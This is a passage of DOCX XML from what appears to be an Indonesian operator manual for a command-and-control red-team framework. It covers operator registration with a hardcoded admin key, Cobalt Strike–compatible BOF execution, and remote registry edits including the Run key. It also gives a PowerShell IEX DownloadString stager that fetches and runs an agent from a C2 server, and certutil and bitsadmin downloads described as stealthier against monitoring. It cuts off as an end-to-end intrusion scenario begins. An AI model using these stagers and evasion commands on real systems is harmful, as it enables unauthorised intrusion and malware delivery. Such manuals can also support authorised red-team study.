            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Register Operator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Server harus dijalankan dengan admin key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/server --admin-key "SuperSecret2026"</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Register sebagai admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://IP:8080/api/v1/team/register \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d '{"name":"alice","role":"admin","admin_key":"SuperSecret2026"}'</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Register sebagai operator (tanpa admin key)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://IP:8080/api/v1/team/register \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d '{"name":"bob","role":"operator"}'</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Register sebagai viewer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://IP:8080/api/v1/team/register \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d '{"name":"carol","role":"viewer"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Team Operations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Subscribe ke SSE event stream (real-time notification)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>team subscribe alice --server http://IP:8080</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List operator aktif</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>team operators</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Claim agent (lock agent untuk operator tertentu)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>team claim &lt;agent-id&gt; --session &lt;SESSION_ID&gt;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Release agent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>team release &lt;agent-id&gt; --session &lt;SESSION_ID&gt;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Broadcast pesan ke semua operator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>team broadcast --message "Mulai fase lateral movement" --session &lt;SESSION_ID&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 18 — ADVANCED TECHNIQUES</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>BOF Execution (Beacon Object Files)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>BOF adalah COFF object file yang dieksekusi in-process oleh agent tanpa menyentuh disk. Compatible dengan Cobalt Strike BOF yang sudah ada.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Eksekusi BOF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bof &lt;agent-id&gt; ./path/to/module.o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BOF dengan argumen</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bof &lt;agent-id&gt; ./whoami.o --args-file packed_args.bin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Contoh BOF yang umum digunakan:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># - BOF Collection (trustedsec)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># - CS-Situational-Awareness-BOF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># - nanodump BOF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Registry Operations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Baca registry value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>registry read &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --hive HKLM \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --value ProductName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Tulis value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>registry write &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --hive HKCU \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --key "Software\Test" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --value MyKey --data "hello" --type sz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List subkeys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>registry list &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --hive HKLM \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"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Hapus value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>registry delete &lt;agent-id&gt; \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --hive HKCU \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --key "Software\Test" --value MyKey --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Stager &amp; Staged Delivery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Stager adalah payload kecil yang men-download dan mengeksekusi agent penuh dari server C2. Berguna untuk bypass size restriction di phishing atau exploit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Upload stage ke server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>stage upload ./bin/agent_windows_stealth.exe</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List stages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>stage list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Dapatkan delivery URL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Format: http://IP:8080/stage/&lt;token&gt;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PowerShell stager (download + exec)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>staged powershell --server http://IP:8080 --token &lt;TOKEN&gt;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Output PS one-liner yang bisa di-paste di target:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># IEX (New-Object Net.WebClient).DownloadString('http://IP:8080/stage/TOKEN')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>LOLBin Fetch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Gunakan Windows built-in tools untuk download file — lebih stealth dari PowerShell WebClient yang sudah banyak di-monitor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Download via certutil (paling umum)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>fetch &lt;agent-id&gt; http://10.10.5.3/tool.exe "C:\Temp\tool.exe" --method certutil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Download via bitsadmin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>fetch &lt;agent-id&gt; http://10.10.5.3/tool.exe "C:\Temp\tool.exe" --method bitsadmin --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Download via PowerShell (fallback)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>fetch &lt;agent-id&gt; http://10.10.5.3/tool.exe "C:\Temp\tool.exe" --method powershell --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 19 — SKENARIO RED TEAM END-TO-END</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Skenario ini mensimulasikan engagement red team lengkap dari initial access hingga domain compromise. Ikuti setiap tahap secara berurutan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Objective</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
